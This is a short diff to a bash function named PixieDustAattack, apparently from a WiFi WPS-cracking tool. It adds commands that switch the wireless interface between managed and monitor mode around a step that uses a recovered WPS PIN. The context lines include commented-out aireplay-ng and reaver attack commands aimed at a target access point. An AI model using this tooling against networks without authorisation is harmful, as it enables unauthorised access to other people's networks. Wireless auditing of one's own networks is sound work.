@@ -350,7 +350,7 @@ function PixieDustAattack {
 
 					if [[ "$PIN" ]]; then
 						echo -e ${Strings13[$LANGUAGE]}"$PIN"
-
+						sudo ip link set "$IFACE" down && sudo iw "$IFACE" set type managed && sudo ip link set "$IFACE" up
 						echo -e "ctrl_interface=/var/run/wpa_supplicant\nctrl_interface_group=0\nupdate_config=1" > /tmp/suppl.conf
 						sudo timeout 60 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo wpa_supplicant -i $IFACE -c /tmp/suppl.conf" &
 						sleep 3
@@ -365,7 +365,7 @@ function PixieDustAattack {
 						fi
 
 						rm /tmp/suppl.conf
-
+						sudo ip link set "$IFACE" down && sudo iw "$IFACE" set monitor control && sudo ip link set "$IFACE" up
 
 						#sudo timeout 120 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -e \"$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $6}')\"" &
 						#sudo timeout 120 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo reaver -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}') -v --no-nacks -p $PIN | tee /tmp/reaver.wpa"
